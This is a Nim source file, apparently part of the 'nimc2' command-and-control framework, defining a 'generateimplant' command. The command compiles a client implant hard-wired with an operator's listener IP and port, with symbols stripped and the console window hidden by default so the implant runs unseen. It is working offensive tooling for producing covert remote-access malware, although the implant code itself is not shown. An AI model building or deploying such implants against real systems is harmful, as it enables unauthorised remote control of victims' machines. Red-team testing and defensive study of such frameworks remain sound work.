import osproc, strutils, asyncdispatch, parseopt

import ../../types
import ../../logging

proc execProc*(args: seq[string], server: C2Server) {.async.} =
  
  var listenerType: string = ""
  var platform: string = ""
  var ip: string = ""
  var port: string = ""
  var showWindow: bool = false

  var slArgs: seq[string] = args
  slArgs[0] = ""

  var p = initOptParser(slArgs.join(" "))

  while true:
    p.next()
    case p.kind
    of cmdEnd: break
    of cmdShortOption, cmdLongOption:
      if p.val != "":
        case p.key:
        of "listener", "l": listenerType = p.val
        of "ip", "i": ip = p.val
        of "port", "p": port = p.val
        of "platform", "P": platform = p.val
        of "showwindow", "s": showWindow = parseBool(p.val)
    of cmdArgument: discard

  if listenerType == "":
    errorLog "you must specify a listener type, check 'help generateimplant' & https://github.com/d4rckh/nimc2/wiki/Usage#generating-an-implant"
    return

  let args_split = listenerType.split(":")
  
  if len(args_split) == 2:
    case args_split[0]
    of "tcp":
      let listenerId = parseInt(args_split[1])

      if not ( (len(server.tcpListeners) - 1) >= listenerId ):
        errorLog "couldn't find tcp listener"
        return

      let tcpListener = server.tcpListeners[listenerId]
      ip = tcpListener.listeningIP
      port = $tcpListener.port

      if ip == "0.0.0.0":
        errorLog "can't automatically generate an implant for this listener because the listening ip is set to 0.0.0.0, you need to use the other command usage format"
        errorLog "generateimplant tcp (ip) (port) (platform)"
        return

      infoLog "generating implant for " & $tcpListener

  let compileCommand = "nim c -d:client " &
    (if showWindow: "" else: "--app=gui " & " ") & # disable window 
    "--passL:-s" & " " &  
    "-d:release" & " " &  
    "-d:ip=" & ip & " " & 
    "-d:port=" & port & " " & 
    (if platform == "windows": "-d:mingw" else: "--os:linux") & " " & 
    "-o:implant" & (if platform == "windows": ".exe " else: " ") & 
    "./src/client/client.nim"

  echo "Running " & compileCommand
  let exitCode = execCmd(compileCommand)

  if exitCode != 0:
    errorLog "failed to build implant, check https://github.com/d4rckh/nimc2/wiki/FAQs"
  else:
    infoLog "saved implant to implant" & (if platform == "windows": ".exe " else: " ") 

let cmd*: Command = Command(
  execProc: execProc,
  name: "generateimplant",
  aliases: @["gi"],
  argsLength: 3,
  usage: @[
    "generateimplant [listenerID] [platform]",
    "generateimplant [listenerType] [ip] [port] [platform]",
  ],
  description: "Generate an implant",
  category: CCImplants
)